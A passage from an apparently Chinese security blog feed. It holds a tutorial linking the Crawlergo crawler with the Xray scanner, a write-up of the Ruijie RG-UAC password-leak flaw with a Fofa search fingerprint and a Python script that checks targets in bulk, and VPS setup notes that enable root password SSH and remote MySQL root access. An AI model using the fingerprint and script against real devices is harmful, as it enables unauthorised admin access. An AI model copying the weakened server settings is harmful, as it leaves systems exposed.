    <updated>2021-03-23T06:45:51.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Crawlergo动态爬虫联动Xray"><a href="#Crawlergo动态爬虫联动Xray" class="headerlink" title="Crawlergo动态爬虫联动Xray"></a>Crawlergo动态爬虫联动Xray</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>被动扫描可以通过代理方式，把浏览过的网页进行漏洞扫描，而一个小巧强大的爬虫可以爬取到足够丰富的 URL 信息，因此就有了 Crawlergo 和 Xray 的梦幻联动。</strong></p><p><strong>项目地址：<a href="https://github.com/timwhitez/crawlergo_x_XRAY">https://github.com/timwhitez/crawlergo_x_XRAY</a></strong></p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p><strong>下载压缩包：<a href="https://github.com/timwhitez/crawlergo_x_XRAY/archive/master.zip">https://github.com/timwhitez/crawlergo_x_XRAY/archive/master.zip</a></strong></p><p><strong>或者 Git 到本地：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/timwhitez/crawlergo_x_XRAY.git</span><br></pre></td></tr></table></figure><h1 id="Crawlergo"><a href="#Crawlergo" class="headerlink" title="Crawlergo"></a>Crawlergo</h1><p><strong>Crawlergo是一个使用 <code>chrome headless</code> 模式进行URL入口收集的动态爬虫。 使用 Golang 语言开发,尽可能的收集网站暴露出的入口。同时，依靠智能URL去重模块，在过滤掉了大多数伪静态URL之后，仍然确保不遗漏关键入口链接，大幅减少重复任务。</strong></p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><strong>下载对应版本放到项目的 crawlergo 文件夹</strong></p><p><strong>Windows 版本：<a href="https://github.com/0Kee-Team/crawlergo/releases/download/v0.4.0/crawlergo_windows_amd64.zip">https://github.com/0Kee-Team/crawlergo/releases/download/v0.4.0/crawlergo_windows_amd64.zip</a></strong></p><p><strong>Mac 版本：<a href="https://github.com/0Kee-Team/crawlergo/releases/download/v0.4.0/crawlergo_darwin_amd64.zip">https://github.com/0Kee-Team/crawlergo/releases/download/v0.4.0/crawlergo_darwin_amd64.zip</a></strong></p><h2 id="使用测试"><a href="#使用测试" class="headerlink" title="使用测试"></a>使用测试</h2><p><strong>测试前需要先确定你的 Chrome 或者 Chromium 浏览器可执行文件的安装位置</strong></p><p><strong>Windows:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\Google\Chrome\Application\chrome.exe</span><br></pre></td></tr></table></figure><p><strong>Mac:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/Google Chrome.app/Contents/MacOS/Google Chrome</span><br></pre></td></tr></table></figure><p><strong>注意这里的Unix 可执行文件需要显示包内容才看得到：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308014131.png" alt="image-20210308014131625"></p><h2 id="爬取URL"><a href="#爬取URL" class="headerlink" title="爬取URL"></a>爬取URL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./crawlergo -c /Applications/Chromium.app/Contents/MacOS/Chromium -t 20 http://testphp.vulnweb.com</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308013601.png" alt="image-20210308013601707"></p><h1 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h1><p><strong>xray 是一款功能强大的安全评估工具，也是一款著名的支持被动扫描的扫描器。</strong></p><h2 id="下载地址-1"><a href="#下载地址-1" class="headerlink" title="下载地址"></a>下载地址</h2><p><strong>下载对应版本放到项目的 xray 文件夹</strong></p><p><strong>Windows 版本：<a href="https://github.com/chaitin/xray/releases/download/1.7.0/xray_windows_amd64.exe.zip">https://github.com/chaitin/xray/releases/download/1.7.0/xray_windows_amd64.exe.zip</a></strong></p><p><strong>Mac 版本：<a href="https://github.com/chaitin/xray/releases/download/1.7.0/xray_darwin_amd64.zip">https://github.com/chaitin/xray/releases/download/1.7.0/xray_darwin_amd64.zip</a></strong></p><h2 id="测试运行"><a href="#测试运行" class="headerlink" title="测试运行"></a>测试运行</h2><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308015125.png" alt="image-20210308015125816"></p><h1 id="Crawlergo联动Xray"><a href="#Crawlergo联动Xray" class="headerlink" title="Crawlergo联动Xray"></a><strong>Crawlergo联动Xray</strong></h1><h2 id="扫描逻辑"><a href="#扫描逻辑" class="headerlink" title="扫描逻辑"></a>扫描逻辑</h2><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/timwhitez/crawlergo_x_XRAY/master/img/5.png"></p><h2 id="食用方法"><a href="#食用方法" class="headerlink" title="食用方法"></a>食用方法</h2><ol><li><p><strong>把 launcher.py 和 targets.txt 放在 crawlergo 目录下</strong></p></li><li><p><strong>配置好并启动xray被动扫描（脚本默认配置为127.0.0.1:7777）若修改端口请同时修改 launcher.py 文件中的 proxies</strong></p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_darwin_amd64 webscan --listen 127.0.0.1:7777 --html-output test.html</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308020400.png" alt="image-20210308020400899"></p><ol start="3"><li><strong>将测试 Crawlergo 爬虫时的浏览器路径替换到 launcher.py 的 cmd 变量</strong></li><li><strong>将目标 URL 写进 targets.txt，一行一个 URL</strong></li><li><strong>运行 launcher.py</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 launcher.py</span><br></pre></td></tr></table></figure><p><strong>遇到报错缺少模块时</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ModuleNotFoundError: No module named <span class="string">&#x27;xx&#x27;</span></span><br></pre></td></tr></table></figure><p> <strong>执行下面命令即可：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install xx</span><br></pre></td></tr></table></figure><h2 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h2><p><strong>crawl ok说明启动成功</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308020854.png" alt="image-20210308020854526"></p><p><strong>Xray 已成功接收 Crawlergo 爬虫的 URL 信息并扫描到漏洞</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308015039.png" alt="image-20210308015039860"></p><p><strong>漏洞信息：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308022353.png" alt="image-20210308022353420"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Crawlergo动态爬虫联动Xray&quot;&gt;&lt;a href=&quot;#Crawlergo动态爬虫联动Xray&quot; class=&quot;headerlink&quot; title=&quot;Crawlergo动态爬虫联动Xray&quot;&gt;&lt;/a&gt;Crawlergo动态爬虫联动Xray&lt;/h1&gt;&lt;h1 i</summary>
      
    
    
    
    <category term="Tools" scheme="https://www.lintstar.top/categories/Tools/"/>
    
    
    <category term="Attack" scheme="https://www.lintstar.top/tags/Attack/"/>
    
    <category term="Xray" scheme="https://www.lintstar.top/tags/Xray/"/>
    
    <category term="Crawlergo" scheme="https://www.lintstar.top/tags/Crawlergo/"/>
    
  </entry>
  
  <entry>
    <title>锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞</title>
    <link href="https://www.lintstar.top/2021/03/6c05e651.html"/>
    <id>https://www.lintstar.top/2021/03/6c05e651.html</id>
    <published>2021-03-08T04:00:58.000Z</published>
    <updated>2021-03-23T06:38:51.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞"><a href="#锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞" class="headerlink" title="锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞"></a>锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞</h2><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><strong>锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台</strong></p><p><strong>编号：CNVD-2021-14536</strong></p><h1 id="Fofa指纹"><a href="#Fofa指纹" class="headerlink" title="Fofa指纹"></a>Fofa指纹</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title&#x3D;&quot;RG-UAC登录页面&quot; &amp;&amp; body&#x3D;&quot;admin&quot;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308161840.png" alt="image-20210308161840038"></p><p><strong>源代码搜索：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308161935.png" alt="image-20210308161935213"></p><p><strong>MD5解密：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308162005.png" alt="image-20210308162005706"></p><p><strong>登录成功</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308162316.png" alt="image-20210308162316216"></p><h1 id="自动化-POC"><a href="#自动化-POC" class="headerlink" title="自动化 POC"></a>自动化 POC</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC_1</span>(<span class="params">target_url</span>):</span></span><br><span class="line">    vuln_url = target_url</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;super_admin&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞 ,F12查看源码获取密码md5值 \033[0m&quot;</span>.format(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.format(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.format(target_url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Scan</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(file_name, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">&quot;http&quot;</span>:</span><br><span class="line">                url = <span class="string">&quot;http://&quot;</span> + url</span><br><span class="line">            url = url.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">&quot;\033[31m[x] 请求报错 \033[0m&quot;</span>.format(e))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = str(input(<span class="string">&quot;\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞&quot;&gt;&lt;a href=&quot;#锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞&quot; class=&quot;headerlink&quot; title=&quot;锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞&quot;&gt;</summary>
      
    
    
    
    <category term="Note" scheme="https://www.lintstar.top/categories/Note/"/>
    
    <category term="Web" scheme="https://www.lintstar.top/categories/Note/Web/"/>
    
    
    <category term="Vulnerability" scheme="https://www.lintstar.top/tags/Vulnerability/"/>
    
    <category term="Fofa" scheme="https://www.lintstar.top/tags/Fofa/"/>
    
  </entry>
  
  <entry>
    <title>VPS 配置记录</title>
    <link href="https://www.lintstar.top/2021/02/bc3116a4.html"/>
    <id>https://www.lintstar.top/2021/02/bc3116a4.html</id>
    <published>2021-02-09T04:00:58.000Z</published>
    <updated>2021-07-03T14:50:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>日常学习工作总需要一台 Linux 主机，但是每次需要配置环境的时候会很繁琐，因此用本文记录一下新装 Linux 的环境配置命令，方便日后使用。</strong></p><h1 id="GCP开启密码与root用户登陆"><a href="#GCP开启密码与root用户登陆" class="headerlink" title="GCP开启密码与root用户登陆"></a>GCP开启密码与root用户登陆</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo -i   //切换到root用户</span><br><span class="line">vi /etc/ssh/sshd_config //编辑文件</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 允许 root 权限登录</span></span><br><span class="line"><span class="comment"># Authentication:</span></span><br><span class="line"><span class="comment"># 限制用户必须在指定的时限内认证成功</span></span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 开启密码登录</span></span><br><span class="line"><span class="comment"># Change to no to disable tunnelled clear text passwords</span></span><br><span class="line">PasswordAuthentication yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 SSH</span></span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 root 密码</span></span><br><span class="line">passwd root</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210305172559.png" alt="image-20210305172559526"></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210305172703.png" alt="image-20210305172703586"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="修改主机名"><a href="#修改主机名" class="headerlink" title="修改主机名"></a>修改主机名</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Xstark&#x27;</span> &gt;/etc/hostname</span><br><span class="line">hostname `cat /etc/hostname`</span><br><span class="line">bash</span><br></pre></td></tr></table></figure><h1 id="CentOS-更换源"><a href="#CentOS-更换源" class="headerlink" title="CentOS 更换源"></a>CentOS 更换源</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br><span class="line">yum -y install wget</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否修改成功</span></span><br><span class="line">cat /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成缓存 升级软件包</span></span><br><span class="line">yum makecache</span><br><span class="line">yum -y update</span><br></pre></td></tr></table></figure><h1 id="CentOS-开启-SSH"><a href="#CentOS-开启-SSH" class="headerlink" title="CentOS 开启 SSH"></a>CentOS 开启 SSH</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测是否安装 openssh-server</span></span><br><span class="line">yum list installed | grep openssh-server</span><br><span class="line"><span class="comment"># 没有输出的话需要执行命令</span></span><br><span class="line">yum install openssh-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑 sshd 的配置文件</span></span><br><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210208124142.png" alt="image-20210208124142515"></p><blockquote><p><strong>AddressFamily</strong><br><strong>指定 sshd(8) 应当使用哪种地址族。取值范围是：”any”(默认)、”inet”(仅IPv4)、”inet6”(仅IPv6)。</strong></p></blockquote><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 Python3.6</span></span><br><span class="line">yum -y install python36</span><br></pre></td></tr></table></figure><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 jdk1.8</span></span><br><span class="line">yum install java-1.8.0-openjdk* -y</span><br><span class="line"><span class="comment"># 查看版本</span></span><br><span class="line">java -version</span><br></pre></td></tr></table></figure><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装:</span></span><br><span class="line">yum install nginx</span><br><span class="line"><span class="comment"># 启用并启动Nginx服务：</span></span><br><span class="line">$ sudo systemctl <span class="built_in">enable</span> nginx</span><br><span class="line">$ sudo systemctl start nginx</span><br><span class="line"><span class="comment"># 停止服务：</span></span><br><span class="line">$ sudo systemctl stop nginx</span><br><span class="line"><span class="comment"># 要验证服务是否正在运行，检查其状态：</span></span><br><span class="line">$ sudo systemctl status nginx</span><br></pre></td></tr></table></figure><h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install mysql-server</span><br><span class="line">sudo systemctl start mysqld.service</span><br></pre></td></tr></table></figure><p>查询 Mysql 状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status mysqld</span><br><span class="line"></span><br><span class="line">● mysqld.service - MySQL 8.0 database server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/mysqld.service; disabled; vendor preset: disabl&gt;</span><br><span class="line">   Active: active (running) since Sat 2021-02-20 20:33:45 PST; 1min 26s ago</span><br><span class="line">  Process: 10223 ExecStartPost=/usr/libexec/mysql-check-upgrade (code=exited, status=0/SUC&gt;</span><br><span class="line">  Process: 10096 ExecStartPre=/usr/libexec/mysql-prepare-db-dir mysqld.service (code=exite&gt;</span><br><span class="line">  Process: 10072 ExecStartPre=/usr/libexec/mysql-check-socket (code=exited, status=0/SUCCE&gt;</span><br><span class="line"> Main PID: 10178 (mysqld)</span><br><span class="line">   Status: <span class="string">&quot;Server is operational&quot;</span></span><br><span class="line">    Tasks: 39 (<span class="built_in">limit</span>: 4773)</span><br><span class="line">   Memory: 295.0M</span><br><span class="line">   CGroup: /system.slice/mysqld.service</span><br><span class="line">           └─10178 /usr/libexec/mysqld --basedir=/usr</span><br><span class="line"></span><br><span class="line">Feb 20 20:33:38 Xstark systemd[1]: Starting MySQL 8.0 database server...</span><br><span class="line">Feb 20 20:33:38 Xstark mysql-prepare-db-dir[10096]: Initializing MySQL database</span><br><span class="line">Feb 20 20:33:45 Xstark systemd[1]: Started MySQL 8.0 database server.</span><br><span class="line">lines 1-16/16 (END)</span><br></pre></td></tr></table></figure><p>设置服务器启动时启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> mysqld</span><br></pre></td></tr></table></figure><p>设置安全策略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0 然后mysql.user  root的host 设置成%</span><br><span class="line">flush</span><br></pre></td></tr></table></figure><h1 id="Ubuntu16-04-升级-Python3-8"><a href="#Ubuntu16-04-升级-Python3-8" class="headerlink" title="Ubuntu16.04 升级 Python3.8"></a>Ubuntu16.04 升级 Python3.8</h1><p><strong>下载源码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.8.0/Python-3.8.0.tgz</span><br></pre></td></tr></table></figure><p><strong>解压源码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvzf Python-3.8.0.tgz</span><br></pre></td></tr></table></figure><p><strong>进入目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Python-3.8.0</span><br></pre></td></tr></table></figure><p><strong>安装python3.8.0依赖</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get dist-upgrade</span><br><span class="line">sudo apt-get install build-essential python-dev python-setuptools python-pip python-smbus libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev libsqlite3-dev tk-dev libssl-dev openssl libffi-dev</span><br></pre></td></tr></table></figure><p><strong>配置安装路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --with-ssl --prefix=/usr/<span class="built_in">local</span>/python3</span><br></pre></td></tr></table></figure><p><strong>编译</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><strong>删除软链接</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /usr/bin/python3</span><br><span class="line">sudo rm -rf /usr/bin/pip3</span><br></pre></td></tr></table></figure><p><strong>新建软链接</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/python3/bin/python3.8 /usr/bin/python3</span><br><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/python3/bin/pip3.8 /usr/bin/pip3</span><br></pre></td></tr></table></figure><p><strong>检查是否安装成功</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">Python 3.8.0 (default, Mar 27 2021, 12:35:37)</span><br><span class="line">[GCC 5.4.0 20160609] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br></pre></td></tr></table></figure><h2 id="升级后无法使用-PIP3-问题解决办法"><a href="#升级后无法使用-PIP3-问题解决办法" class="headerlink" title="升级后无法使用 PIP3 问题解决办法"></a>升级后无法使用 PIP3 问题解决办法</h2><p>报错信息如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210328162425.png" alt="image-20210328162425224"></p><p><strong>原因是是找不到 lsb_release 模块</strong></p><p><strong>使用下面的命令查找：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo find / -name <span class="string">&#x27;lsb_release.py&#x27;</span></span><br><span class="line">/usr/share/pyshared/lsb_release.py</span><br><span class="line">/usr/lib/python2.7/dist-packages/lsb_release.py</span><br><span class="line">/usr/lib/python3/dist-packages/lsb_release.py</span><br></pre></td></tr></table></figure><p><strong>复制到报错的目录下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /usr/lib/python3/dist-packages/lsb_release.py /usr/<span class="built_in">local</span>/python3/lib/python3.8/</span><br></pre></td></tr></table></figure><p>问题解决：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 